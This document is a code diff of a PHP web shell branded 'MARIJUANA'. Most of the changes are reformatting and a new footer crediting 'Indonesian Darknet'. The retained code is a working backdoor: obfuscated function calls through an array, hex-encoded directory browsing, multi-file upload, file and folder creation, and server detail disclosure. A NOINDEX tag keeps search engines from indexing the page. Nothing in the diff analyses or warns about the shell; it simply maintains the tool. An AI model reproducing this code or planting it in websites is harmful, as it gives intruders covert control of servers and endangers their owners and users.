@@ -46,49 +46,47 @@ for($i=0;$i<$___;$i++) {
 }
 ?>
 <!DOCTYPE html>
-	<html dir="auto" lang="en-US">
+<html dir="auto" lang="en-US">
 
-		<head>
-			<meta charset="UTF-8">
-			<meta name="robots" content="NOINDEX, NOFOLLOW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="robots" content="NOINDEX, NOFOLLOW">
 
-				<title>MARIJUANA</title>
+  <title>MARIJUANA</title>
 
-			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
-			<link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
+  <link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
+  <link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
 
-			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
-		</head>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
+</head>
 
-		<body>
-			<header>
-				<div class="y x">
-					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
-						MARIJuANA
-					</a>
-				</div>
+<body>
+  <header>
+    <div class="y x">
+      <a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
+        -?- MARIJUANA -?-
+      </a>
+    </div>
 
-				<div class="q x w">
-					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
-				</div>
-				
-			</header>
+    <div class="q x w">&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212; LASKAR &#8212;</div>
 
-			<article>
-				<div class="i">
-					<i class="far fa-hdd"></i>
-					<?php echo $GNJ[0]();?>
+  </header>
 
-					<br />
+  <article>
+    <div class="i">
+      <i class="far fa-hdd"></i>
+      <?php echo $GNJ[0]();?>
 
-					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
+      <br />
 
-					<br />
+      <i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
 
-					<i class="far fa-folder"></i>
-					
-					<?php
+      <br />
+
+      <i class="far fa-folder"></i>
+
+      <?php
 					if(isset($_GET["d"])) {
 						$d = uhex($_GET["d"]);
 						$GNJ[2](uhex($_GET["d"]));
@@ -115,23 +113,23 @@ for($i=0;$i<$___;$i++) {
 					}
 					?>
 
-					<br />
+      <br />
 
-				</div>
+    </div>
 
-				<div class="u">
-					<?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
-					<br />
+    <div class="u">
+      <?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
+      <br />
 
-					<br />
+      <br />
 
-					<form method="post" enctype="multipart/form-data">
-						<label class="l w">
-							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
-						</label>&nbsp;
-					</form>
+      <form method="post" enctype="multipart/form-data">
+        <label class="l w">
+          <input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
+        </label>&nbsp;
+      </form>
 
-					<?php
+      <?php
 					$o_ = [ 
 							'<script>$.notify("',
 							'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
@@ -152,8 +150,8 @@ for($i=0;$i<$___;$i++) {
 					}
 					?>
 
-				</div>
-					<?php
+    </div>
+    <?php
 					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
 						<thead>
 							<tr>
@@ -379,8 +377,8 @@ for($i=0;$i<$___;$i++) {
 						<tbody>
 							<tr>
 								<td>
-									<a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
-									<a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
+									<a class="ajx" href="?d='.hex($d).'&n" style="font-weight: bold;">+FILE</a>
+									<a class="ajx" href="?d='.hex($d).'&l" style="font-weight: bold;">+DIR</a>
 								</td>
 							</tr>
 						';
@@ -485,11 +483,11 @@ for($i=0;$i<$___;$i++) {
 					}
 					?>
 
-			</article>
-			<footer class="x">
-				&copy;TheAlmightyZeus
-			</footer>
-			<?php
+  </article>
+  <footer class="x">
+    Copyright &copy; 2021 - Powered By Indonesian Darknet
+  </footer>
+  <?php
 			if(isset($_GET["1"])) {
 				echo $f;
 			}
@@ -501,11 +499,16 @@ for($i=0;$i<$___;$i++) {
 			}
 			?>
 
-			<script>
-				$(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
-			</script>
-		</body>
-	</html>
+  <script>
+    $(".ajx").click(function(t) {
+      t.preventDefault();
+      var e = $(this).attr("href");
+      history.pushState("", "", e), $.get(e, function(t) { $("body").html(t) })
+    });
+  </script>
+</body>
+
+</html>
 <?php
 	function rec($j) {
 		global $GNJ;
